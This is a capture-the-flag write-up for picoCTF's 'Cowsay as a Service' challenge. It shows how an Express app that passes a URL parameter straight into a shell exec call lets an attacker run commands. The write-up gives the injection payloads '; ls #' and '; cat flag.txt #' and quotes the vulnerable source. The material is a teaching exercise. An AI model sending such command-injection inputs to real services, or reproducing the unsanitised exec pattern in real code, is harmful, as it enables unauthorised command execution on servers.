
# Description #

Now presenting cowsay as a service


# Cowsay as a Service

**Make a request to the following URL to cowsay your message:**  
`https://caas.mars.picoctf.net/cowsay/{message}`



# Process #


This exploitation is very simple, its a remote command execution vulnerability 


`https://caas.mars.picoctf.net/cowsay/message`

This retrieves a cow giving you a message.

If you put message ; ls # 

`https://caas.mars.picoctf.net/cowsay/message ; ls #`

you will see the files of the machine



if you put cat flag.txt you will see the fag.

`https://caas.mars.picoctf.net/cowsay/message; cat flag.txt #`


```
picoCTF{*******************}
```



# Assets #

index.js
```
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});


```